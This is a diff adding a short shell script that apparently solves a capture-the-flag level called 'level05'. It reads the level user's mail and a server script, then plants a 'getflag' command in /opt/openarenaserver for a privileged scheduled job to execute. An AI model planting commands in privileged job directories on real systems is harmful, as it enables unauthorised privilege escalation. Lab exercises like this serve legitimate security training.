@@ -1,0 +1,4 @@
+find / -name 'level05'  2>/dev/null
+cat /var/mail/level05
+cat  /usr/sbin/openarenaserver
+echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag && echo
